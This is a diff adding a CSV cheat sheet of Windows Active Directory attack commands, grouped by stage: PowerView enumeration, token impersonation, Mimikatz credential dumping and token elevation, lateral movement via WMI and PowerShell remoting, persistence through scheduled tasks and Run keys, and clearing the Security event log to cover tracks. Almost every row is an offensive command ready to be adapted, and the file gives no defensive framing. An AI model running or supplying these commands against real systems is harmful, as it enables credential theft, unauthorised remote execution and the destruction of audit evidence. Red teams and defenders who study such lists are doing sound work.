@@ -1,0 +1,15 @@
+Category,Tool / Command,Description
+Active Directory Enumeration,Get-NetUser -UserName <user>,Enumerate user properties
+Active Directory Enumeration,Get-NetGroup -GroupName 'Domain Admins',List members of Domain Admins group
+Active Directory Enumeration,Get-NetComputer -FullData,Enumerate all domain computers
+Token Impersonation,whoami /groups,Show current user group memberships
+Token Impersonation,Invoke-TokenManipulation,Impersonate user tokens (PowerSploit)
+Credential Abuse / Privilege Escalation,mimikatz sekurlsa::logonpasswords,Dump credentials from memory (Mimikatz)
+Credential Abuse / Privilege Escalation,Invoke-Mimikatz -Command 'token::elevate',Elevate token to SYSTEM or high-privilege
+Lateral Movement,Invoke-WMIExec -Target <hostname> -Command <cmd>,Execute command remotely over WMI
+Lateral Movement,Invoke-Command -ComputerName <target> -ScriptBlock { <code> },Use PowerShell remoting for lateral movement
+Lateral Movement,"wmic /node:<target> process call create ""cmd.exe /c <payload>""",Spawn a process on a remote machine via WMI
+Persistence,New-ScheduledTaskTrigger,Create a scheduled task for persistence
+Persistence,Set-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\Run,Registry key persistence method (Run key)
+Cleanup & Stealth,Clear-EventLog -LogName Security,Clear security event log (noisy)
+Cleanup & Stealth,wevtutil cl Security,Clear log using native wevtutil tool
